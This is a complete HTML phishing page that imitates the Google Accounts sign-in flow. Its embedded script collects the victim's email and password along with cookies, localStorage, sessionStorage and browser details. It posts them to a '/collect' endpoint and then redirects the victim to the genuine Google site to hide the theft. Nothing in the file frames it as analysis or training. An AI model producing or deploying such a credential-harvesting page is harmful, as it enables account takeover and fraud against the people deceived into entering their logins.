<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Arial, sans-serif; }
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; max-width: 450px; width: 100%; box-shadow: 0 1px 3px rgba(0,0,0,.08); }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo svg { width: 75px; height: 24px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #5f6368; font-size: 14px; margin-bottom: 32px; }
        .input-group { margin-bottom: 16px; position: relative; }
        .input-group input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; transition: border .2s; box-sizing: border-box; }
        .input-group input:focus { border-color: #1a73e8; }
        .input-group label { position: absolute; left: 15px; top: 13px; color: #5f6368; font-size: 16px; pointer-events: none; transition: .2s; background: #fff; padding: 0 4px; }
        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label { top: -10px; font-size: 12px; color: #1a73e8; }
        .forgot { margin-top: 4px; }
        .forgot a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .forgot a:hover { color: #174ea6; }
        .guest { margin-top: 40px; }
        .guest a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .btn-group { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
        .btn-create a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .btn-next { background: #1a73e8; color: #fff; border: none; padding: 9px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background .2s; }
        .btn-next:hover { background: #1b66c9; }
        .error { color: #d93025; font-size: 12px; margin-top: 4px; display: none; }
        .loader { display: none; text-align: center; margin: 20px 0; }
        .loader span { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #1a73e8; margin: 0 4px; animation: bounce 1.4s infinite ease-in-out both; }
        .loader span:nth-child(1) { animation-delay: -0.32s; }
        .loader span:nth-child(2) { animation-delay: -0.16s; }
        @keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 75 24"><path d="M8 24V8H5V5h3V2c0-2 1.5-4 4-4h3v3h-2c-1 0-2 .5-2 2v2h4v3h-8v16H8z" fill="#1a73e8"/></svg>
        </div>
        <h1>Sign in</h1>
        <div class="subtitle">Use your Google Account</div>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="email" name="email" placeholder=" " required autocomplete="off" autofocus>
                <label for="email">Email or phone</label>
                <div class="error" id="emailError">Couldn't find your Google Account</div>
            </div>

            <div class="input-group" id="passGroup" style="display:none;">
                <input type="password" id="password" name="password" placeholder=" " autocomplete="off">
                <label for="password">Enter your password</label>
                <div class="error" id="passError">Wrong password. Try again or click Forgot password</div>
            </div>

            <div class="forgot"><a href="#">Forgot email?</a></div>
            <div class="guest"><a href="#">Use your device instead</a></div>

            <div class="loader" id="loader">
                <span></span><span></span><span></span>
                <p style="margin-top:12px;font-size:13px;color:#5f6368;">Verifying your info...</p>
            </div>

            <div class="btn-group">
                <div class="btn-create"><a href="#">Create account</a></div>
                <button type="submit" class="btn-next" id="submitBtn">Next</button>
            </div>
        </form>
    </div>

    <script>
    let step = 1;

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        if (step === 1) {
            if (!email.includes('@')) {
                document.getElementById('emailError').style.display = 'block';
                return;
            }
            document.getElementById('emailError').style.display = 'none';
            document.getElementById('passGroup').style.display = 'block';
            document.getElementById('submitBtn').textContent = 'Sign in';
            document.getElementById('password').focus();
            step = 2;
            return;
        }

        document.getElementById('loader').style.display = 'block';
        document.getElementById('submitBtn').disabled = true;

        const payload = {
            email: email,
            password: password,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            timestamp: new Date().toISOString(),
            pageUrl: window.location.href,
            referrer: document.referrer
        };

        fetch('/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(() => {
            window.location.href = 'https://accounts.google.com';
        })
        .catch(() => {
            window.location.href = 'https://accounts.google.com';
        });
    });
    </script>
</body>
</html>
